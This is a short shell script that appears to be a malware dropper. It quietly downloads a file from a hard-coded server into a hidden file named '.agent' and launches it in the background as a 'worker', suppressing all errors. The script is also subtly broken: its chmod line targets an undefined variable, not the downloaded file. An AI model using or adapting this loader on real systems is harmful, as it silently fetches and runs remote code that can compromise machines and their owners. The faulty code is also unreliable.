#!/bin/sh
SRV="http://203.0.113.8"
f=".agent"
if command -v wget >/dev/null 2>&1; then wget -q -O "$f" "$SRV/binary" && ok=1; fi
if [ "$ok" = "1" ]; then chmod +x "$other" 2>/dev/null; ./"$f" worker 2>/dev/null & fi
